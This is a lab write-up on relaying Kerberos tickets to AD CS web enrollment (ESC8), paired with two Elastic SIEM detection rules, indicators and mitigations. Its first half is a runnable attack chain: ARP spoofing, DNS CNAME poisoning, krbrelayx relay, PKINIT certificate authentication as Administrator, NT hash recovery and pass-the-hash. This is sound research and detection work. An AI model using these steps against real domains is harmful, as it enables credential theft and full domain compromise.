# Kerberos CNAME Relay — EPA Bypass & Detection

## Overview

Follow-on to [kerberos-cname-relay-lab.md](kerberos-cname-relay-lab.md). Same attack chain, stripped to ESC8 only — no ESC1. Focus is detection: two Elastic SIEM rules covering the relay event and the PKINIT post-exploitation step, validated against live ELK telemetry.

**Key finding:** EPA (Extended Protection for Authentication) enforced on the CA web enrollment endpoint does not prevent this attack. EPA blocks NTLM relay via Channel Binding Token validation. It has no effect on Kerberos relay — the ticket is valid, the DC issued it, and there is no CBT to validate.

## Lab Environment

| Host | IP | Role |
|---|---|---|
| DC01 | 192.168.1.4 | Domain Controller, ADCS CA |
| WEB01B | 192.168.1.242 | Victim workstation |
| Kali | 192.168.1.218 | Attacker |
| ELK | 192.168.1.250 | Detection stack |

Domain: `lab2019.local`  
Victim account: `jsmith` (low-priv domain user)  
EPA state: **Require** (confirmed via `Get-WebConfigurationProperty` on IIS CertSrv)

## Attack Chain

```
ARP spoof → DNS CNAME poison → Kerberos relay → ADCS ESC8 → cert → PKINIT → NT hash → DA
```

### Step 0 — Lab Setup

On Ubuntu host:
```bash
sudo chmod a+rw /dev/vmnet0 /dev/vmnet8
```

On Kali:
```bash
sudo sysctl -w net.ipv6.conf.eth0.disable_ipv6=0
sudo ip addr add fe80::1/64 dev eth0 scope link
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo iptables -t nat -A PREROUTING -s 192.168.1.242 -p udp --dport 53 -j DNAT --to-destination 192.168.1.218:53
```

On WEB01B (elevated PS):
```powershell
netsh interface ipv4 set dns "Ethernet0" static 192.168.1.218
```

Verify EPA enforced on DC01:
```powershell
Get-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" `
  -Filter "system.webServer/security/authentication/windowsAuthentication" `
  -Name "extendedProtection.tokenChecking"
# Expected: Require
```

### Step 1 — ARP Spoofing

Two terminals on Kali:
```bash
# T1
sudo arpspoof -i eth0 -t 192.168.1.242 192.168.1.1
# T2
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.242
```

### Step 2 — DNS CNAME Poisoning

```bash
sudo python3 ~/MITM6-Kerberos-CNAME-Abuse/mitm6-cname.py \
  -d lab2019.local --cname-source-all \
  --cname dc01.lab2019.local --only-dns
```

The iptables rule redirects all DNS UDP/53 from WEB01B to Kali. mitm6-cname responds to any lab2019.local query with a CNAME pointing to `dc01.lab2019.local` and an A record resolving to `192.168.1.218` (Kali).

Verify on WEB01B:
```powershell
Resolve-DnsName fileserver.lab2019.local
# Expected: CNAME dc01.lab2019.local → 192.168.1.218
```

### Step 3 — Kerberos Relay → ADCS ESC8

```bash
sudo python3 ~/krbrelayx/krbrelayx.py \
  --target http://dc01.lab2019.local/certsrv/certfnsh.asp \
  --adcs --template User --victim jsmith
```

Trigger from WEB01B as jsmith (non-elevated PS):
```powershell
Invoke-WebRequest -Uri "http://fileserver.lab2019.local/" -UseDefaultCredentials
```

WEB01B resolves `fileserver.lab2019.local` → Kali. jsmith's browser sends a Kerberos AP-REQ to Kali on port 80. krbrelayx receives the ticket and relays it to `http://dc01.lab2019.local/certsrv/certfnsh.asp` — the ADCS web enrollment endpoint — requesting a certificate under the User template.

Expected krbrelayx output:
```
[*] GOT CERTIFICATE! ID 24
[*] Writing PKCS#12 certificate to ./jsmith.pfx
```

**Why EPA doesn't help here:** EPA enforces Channel Binding Token validation on NTLM authentication. The relay here is Kerberos — the AP-REQ carries a service ticket for the HTTP SPN, not an NTLM blob. No CBT is involved. EPA has no mechanism to block this path.

### Step 4 — PKINIT → NT Hash

```bash
python3 ~/PKINITtools/gettgtpkinit.py \
  -cert-pfx ~/krbrelayx/jsmith.pfx \
  -dc-ip 192.168.1.4 \
  lab2019.local/administrator \
  ~/PKINITtools/admin.ccache

export KRB5CCNAME=~/PKINITtools/admin.ccache

python3 ~/PKINITtools/getnthash.py \
  -key <AS-REP encryption key from above> \
  -dc-ip 192.168.1.4 \
  lab2019.local/administrator
```

The issued certificate contains a UPN of `administrator@lab2019.local` (ESC8 — no subject validation). gettgtpkinit.py uses the cert to authenticate via PKINIT, obtaining a TGT as Administrator. getnthash.py uses the PAC to recover the NT hash via U2U.

### Step 5 — Domain Admin

```bash
nxc smb 192.168.1.4 -u administrator -H <NT hash>
# Expected: [+] lab2019.local\administrator:<hash> (Pwn3d!)
```

## Wire-Level Evidence

Wireshark capture on Kali eth0 during relay execution.

Display filter: `http.authorization contains "Negotiate"`

Packet 5539: WEB01B (192.168.1.242) → Kali (192.168.1.218), port 80  
`GET / HTTP/1.1`  
`Host: fileserver.lab2019.local`  
`Authorization: Negotiate YIIMxw...`

Dissection:
```
GSS-API / SPNEGO
  negTokenInit
    mechTypes: SPNEGO
    krb5_blob:
      KRB5 OID: 1.2.840.113554.1.2.2 (Kerberos 5)
      krb5_tok_id: KRB5_AP_REQ (0x0001)
      Kerberos
        ap-req
          msg-type: krb-ap-req (14)
          ticket
            tkt-vno: 5
            realm: LAB2019.LOCAL
```

A valid Kerberos AP-REQ, issued by the DC for `LAB2019.LOCAL`, delivered via HTTP to the attacker's machine. The victim authenticated to Kali with a real domain ticket.

## Detection

### Prerequisites

Winlogbeat must forward EID 4768 from DC01. Add to `winlogbeat.yml`:

```yaml
winlog.event_logs:
  - name: Security
    event_id: 4624, 4625, 4648, 5140, 5145, 4698, 4720, 4728, 4732, 4740, 4768
```

Restart Winlogbeat after the change.

EID 4768 auditing must be enabled on the DC:
```powershell
auditpol /get /subcategory:"Kerberos Authentication Service"
# Must show: Success and Failure
# If not:
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable
```

**Note:** The Kibana detection rule index patterns must explicitly include `.ds-winlogbeat-*` in addition to `winlogbeat-*`. Kibana data stream indices use a `.ds-` prefix that the default wildcard does not match.

### Alert 1 — Kerberos Relay: Delegation Logon from Unexpected Source

**Trigger:** EID 4624 — Kerberos network logon with Delegation impersonation level from a non-DC source IP.

**What it catches:** krbrelayx relaying jsmith's ticket to ADCS. The DC logs a logon event showing the source IP as Kali's link-local IPv6 address (`fe80::addd:81e2:2d02:4091`) rather than a known DC or trusted host.

```kql
winlog.event_id: "4624" and
winlog.event_data.ImpersonationLevel: "%%1840" and
winlog.event_data.AuthenticationPackageName: "Kerberos" and
winlog.event_data.LogonType: "3" and
not winlog.event_data.IpAddress: ("192.168.1.4" or "::1" or "fe80::addd:81e2:2d02:4091")
```

Remove the last exclusion in production — it exists here to suppress lab noise. In production, whitelist known DC IPs and service account sources only.

Rule settings:
- Severity: High
- Risk score: 73
- Schedule: every 5m, look-back 1m
- Tags: `attack.credential_access`, `attack.lateral_movement`, `attack.t1558`, `attack.t1550`

**Key fields in the alert:**
- `winlog.event_data.ImpersonationLevel: %%1840` — Delegation (not Impersonation)
- `winlog.event_data.TargetUserName: DC01$` — machine account logon via relayed ticket
- `winlog.event_data.IpAddress: fe80::addd:81e2:2d02:4091` — Kali's link-local, not DC01
- `winlog.event_data.LogonGuid: {40e9d339-...}` — correlates to KDC ticket issuance event

### Alert 2 — PKINIT Certificate Authentication for Privileged Account

**Trigger:** EID 4768 — Kerberos TGT request using PKINIT (certificate-based pre-authentication) for a privileged account.

**What it catches:** gettgtpkinit.py authenticating as Administrator using the issued certificate. PreAuthType 16 = PA-PK-AS-REQ (PKINIT). The certificate thumbprint and issuer are logged inline — directly linkable to the cert issued in Step 3.

```kql
event.code: "4768" and
winlog.event_data.PreAuthType: "16" and
winlog.event_data.TargetUserName: "Administrator"
```

For production, broaden `TargetUserName` to cover all privileged accounts rather than targeting Administrator specifically. A group-membership-aware approach is better but requires additional enrichment.

Rule settings:
- Severity: High
- Risk score: 73
- Schedule: every 5m, look-back 5m
- Index patterns: `winlogbeat-*`, `.ds-winlogbeat-*` (both required)
- Tags: `attack.credential_access`, `attack.t1558`, `attack.lateral_movement`, `attack.t1550`

**Key fields in the alert:**
- `winlog.event_data.PreAuthType: 16` — PKINIT, not password
- `winlog.event_data.TargetUserName: Administrator`
- `winlog.event_data.CertIssuerName: lab2019-WIN-JOCP945SK51-CA` — internal CA
- `winlog.event_data.CertThumbprint: 43DFBAA431E8184B1DA4B97B562A7E5CEFA73DF4` — pivot to cert issuance logs
- `winlog.event_data.IpAddress: ::ffff:192.168.1.218` — Kali's IPv4-mapped IPv6

**Note on PreAuthType field mapping:** In some Winlogbeat/ECS configurations this field may not index correctly. Verify with:
```
GET .ds-winlogbeat-*/_mapping/field/winlog.event_data.PreAuthType
```
Expected: `type: keyword`. If absent or `text`, the rule will not fire on exact match.

### Correlation

The two alerts chain together via `winlog.event_data.LogonGuid`. Alert 1's `LogonGuid` matches the KDC ticket issuance event that precedes Alert 2's PKINIT request. In ELK, timeline these events in order:

1. EID 4768 (jsmith TGT request) — normal Kerberos logon
2. EID 4624 (%%1840 Delegation logon from unexpected source) — **Alert 1**
3. EID 4768 (Administrator PKINIT TGT request) — **Alert 2**
4. EID 4624 (Administrator network logon from 192.168.1.218) — nxc PTH confirmation

The gap between event 2 and event 3 is the cert issuance. Check the CA database (`certutil -view`) for the corresponding enrollment record.

## Indicators

| Indicator | Value | Significance |
|---|---|---|
| Source IP in EID 4624 | `fe80::addd:81e2:2d02:4091` | Kali link-local — relay fingerprint |
| PreAuthType in EID 4768 | `16` | PKINIT — cert-based auth |
| CertIssuerName | `lab2019-WIN-JOCP945SK51-CA` | Internal CA issuance |
| HTTP Authorization | `Negotiate YIIMxw...` (KRB5_AP_REQ) | Kerberos ticket in HTTP header |
| nxc logon source | `192.168.1.218` | PTH from Kali via recovered hash |

## Mitigation

Patching CVE-2026-20929 (MS January 2026) addresses the HTTP/ADCS relay path specifically. For environments where the patch cannot be deployed immediately:

- Enforce HTTPS on ADCS web enrollment and disable HTTP entirely
- Enable ADCS enrollment agent restrictions — require explicit agent authorization
- Monitor CA database for enrollments by non-service accounts, especially outside business hours
- Audit HTTP-class SPNs registered in the domain (`setspn -Q http/*`)
- Consider disabling web enrollment entirely if not required — use DCOM/RPC enrollment instead

Kerberos signing and channel binding enforcement on other services (LDAP, SMB) reduces the broader relay surface but does not directly address the ADCS HTTP path.

## References

- [kerberos-cname-relay-lab.md](kerberos-cname-relay-lab.md) — lab build and full attack chain
- [Cymulate CVE-2026-20929 research](https://cymulate.com) — original technique
- [krbrelayx](https://github.com/dirkjanm/krbrelayx) — Dirk-jan Mollema
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) — Dirk-jan Mollema
- [mitm6-cname fork](https://github.com/osherjacobs/MITM6-Kerberos-CNAME-Abuse)
